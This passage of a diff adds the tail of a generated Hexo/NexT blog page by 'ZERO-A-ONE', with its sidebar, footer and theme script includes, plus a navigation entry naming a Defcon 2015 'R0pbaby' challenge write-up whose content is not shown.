href="#Defcon-2015-Qualifier-R0pbaby"><span class="nav-number">1.7.3.</span> <span class="nav-text">Defcon 2015 Qualifier: R0pbaby</span></a></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
